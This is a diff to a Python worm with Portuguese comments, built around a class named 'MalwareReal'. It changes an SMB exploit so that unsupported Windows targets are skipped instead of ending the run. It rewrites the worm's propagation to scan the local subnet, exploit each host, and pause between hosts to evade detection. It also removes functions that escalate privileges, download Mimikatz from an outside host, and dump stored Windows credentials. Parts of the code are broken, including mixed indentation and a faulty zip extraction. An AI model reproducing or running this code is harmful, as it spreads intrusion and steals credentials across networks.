@@ -291,155 +291,7 @@ def get_smb_credentials():
     except Exception:
         # Fallback extremo
         return "Guest", ""
-
-def is_admin():
-    """Verifica se o script está sendo executado como administrador"""
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
-
-def elevate_privileges():
-    """Tenta elevar privilégios automaticamente"""
-    if not is_admin():
-        try:
-            # Re-executa o script com privilégios de administrador
-            ctypes.windll.shell32.ShellExecuteW(
-                None, "runas", sys.executable, " ".join(sys.argv), None, 1
-            )
-            sys.exit(0)
-        except Exception as e:
-            print(f"Falha ao elevar privilégios: {e}")
-            return False
-    return True
-
-def download_mimikatz():
-    """Baixa o Mimikatz automaticamente"""
-    mimikatz_url = "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip"
-    temp_dir = tempfile.gettempdir()
-    mimikatz_dir = os.path.join(temp_dir, "mimikatz")
-    
-    try:
-        # Cria diretório temporário
-        if not os.path.exists(mimikatz_dir):
-            os.makedirs(mimikatz_dir)
-        
-        # Baixa o Mimikatz
-        zip_path = os.path.join(mimikatz_dir, "mimikatz.zip")
-        print("Baixando Mimikatz...")
-        
-        with urllib.request.urlopen(mimikatz_url) as response, open(zip_path, 'wb') as out_file:
-            shutil.copyfileobj(response, out_file)
-        
-        # Extrai o arquivo ZIP
-        with zipfile.ZipFile(io.BytesIO(response.content)) as zip_ref:
-            zip_ref.extractall(mimikatz_dir)
-        
-        print("Mimikatz baixado e extraído com sucesso!")
-        
-        # Procura pelo executável dentro do diretório extraído
-        for root, dirs, files in os.walk(mimikatz_dir):
-            for file in files:
-                if file.lower() == "mimikatz.exe":
-                    return os.path.join(root, file)
-        
-        # Se não encontrar, retorna o caminho esperado
-        return os.path.join(mimikatz_dir, "mimikatz.exe")
-        
-    except Exception as e:
-        print(f"Erro ao baixar Mimikatz: {e}")
-        return None
-
-def find_mimikatz():
-    """Tenta encontrar o Mimikatz no sistema"""
-    # Verifica no PATH
-    mimikatz_path = shutil.which("mimikatz.exe")
-    if mimikatz_path:
-        return mimikatz_path
-    
-    # Verifica em locais comuns
-    common_paths = [
-        "C:\\Tools\\mimikatz\\mimikatz.exe",
-        "C:\\mimikatz\\mimikatz.exe",
-        os.path.join(os.environ.get('USERPROFILE', ''), "Downloads", "mimikatz", "mimikatz.exe")
-    ]
-    
-    for path in common_paths:
-        if os.path.exists(path):
-            return path
-    
-    # Se não encontrou, tenta baixar
-    return download_mimikatz()
-
-def get_windows_credentials(target_name):
-    """Extrai credenciais do Windows usando Mimikatz"""
-    try:
-        # Eleva privilégios se necessário
-        if not is_admin():
-            print("Privilégios de administrador necessários...")
-            if not elevate_privileges():
-                return None
-        
-        # Encontra ou instala o Mimikatz
-        mimikatz_path = find_mimikatz()
-        if not mimikatz_path:
-            print("Mimikatz não encontrado e não pôde ser baixado")
-            return None
-        
-        # Executa o Mimikatz
-        command = f'"{mimikatz_path}" "privilege::debug" "vault::cred /patch" "exit"'
-        result = subprocess.run(command, capture_output=True, text=True, shell=True, timeout=30)
-        
-        # Parse do output
-        pattern = rf"Target Name\s+:\s+{re.escape(target_name)}.*?Credential\s+:\s+([^\s]+)"
-        match = re.search(pattern, result.stdout, re.DOTALL | re.IGNORECASE)
-        
-        return match.group(1) if match else None
-        
-    except subprocess.TimeoutExpired:
-        print("Mimikatz timeout - processo levou muito tempo")
-        return None
-    except Exception as e:
-        print(f"Erro no Mimikatz: {e}")
-        return None
-
-def set_windows_credentials(target_name, username, password):
-    """Armazena credenciais no Windows usando Mimikatz"""
-    try:
-        # Eleva privilégios
-        if not is_admin():
-            print("Privilégios de administrador necessários...")
-            if not elevate_privileges():
-                return False
-        
-        # Encontra o Mimikatz
-        mimikatz_path = find_mimikatz()
-        if not mimikatz_path:
-            print("Mimikatz não encontrado")
-            return False
-        
-        # Executa comando para adicionar credenciais
-        command = (
-            f'"{mimikatz_path}" '
-            f'"privilege::debug" '
-            f'"vault::add /credtype:generic /target:{target_name} '
-            f'/username:{username} /password:{password}" '
-            '"exit"'
-        )
-        
-        result = subprocess.run(command, capture_output=True, text=True, shell=True, timeout=30)
-        
-        if result.returncode == 0:
-            print("Credenciais armazenadas com sucesso!")
-            return True
-        else:
-            print(f"Falha ao armazenar credenciais: {result.stderr}")
-            return False
-            
-    except Exception as e:
-        print(f"Erro ao armazenar credenciais: {e}")
-        return False
-
+		
     try:
         # Tenta obter credenciais existentes
         USERNAME = getpass.getuser()
@@ -739,13 +591,17 @@ def exploit(target, shellcode, numGroomConn):
     server_os = conn.get_server_os()
     print('Target OS: ' + server_os)
 	if server_os.startswith("Windows 10 "):
-		build = int(server_os.split()[-1])
-		if build >= 14393:  
-			print('This exploit does not support this target')
-			sys.exit()
+	    build = int(server_os.split()[-1])
+	    if build >= 14393:  
+	        print(f'[!] Alvo {target} não vulnerável (Windows 10 build {build})')
+	        conn.logoff()
+	        conn.get_socket().close()
+	        return False  # Retorna falha mas continua execução
 	elif not (server_os.startswith("Windows 8") or server_os.startswith("Windows Server 2012 ")):
-		print('This exploit does not support this target')
-		sys.exit()
+	    print(f'[!] Alvo {target} com OS não suportado: {server_os}')
+	    conn.logoff()
+	    conn.get_socket().close()
+	    return False
 	tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
 	progress = send_big_trans2(conn, tid, 0, feaList, b'\x00'*30, len(feaList)%4096, False)
 	nxconn = smb.SMB(target, target)
@@ -1546,18 +1402,22 @@ class MalwareReal:
         social_thread = threading.Thread(target=self.propagate_social)
         social_thread.daemon = True
         social_thread.start()
-    def propagate_network(self):
-        """Propagação através da rede local usando múltiplos protocolos"""
-        try:
-            ip_base = '.'.join(self.get_local_ip().split('.')[:3]) + '.'
-            for i in range(1, 255):
-                ip = ip_base + str(i)
-                self.infect_network_share(ip)      
-                self.infect_rdp(ip)               
-                self.infect_ssh(ip)               
-                self.exploit_network_services(ip) 
-        except Exception:
-            pass
+	def propagate_network(self):
+	    """Propagação através da rede local usando múltiplos protocolos"""
+	    try:
+	        ip_base = '.'.join(self.get_local_ip().split('.')[:3]) + '.'
+	        for i in range(1, 255):
+	            ip = ip_base + str(i)
+	            try:
+	                if not self.exploit_target(ip):  # Função modificada
+	                    continue  # Continua para o próximo IP
+	            except Exception as e:
+	                print(f"Falha com {ip}: {e}")
+	                continue
+	            time.sleep(0.5)  # Evita detecção
+	    except Exception as e:
+	        print(f"Erro no scan de rede: {e}")
+			
     def get_local_ip(self):
         """Obtém o IP local"""
         try:
@@ -2063,6 +1923,7 @@ if __name__ == "__main__":
         pass
     malware = MalwareReal()
     malware.execute()
+
 
 
 
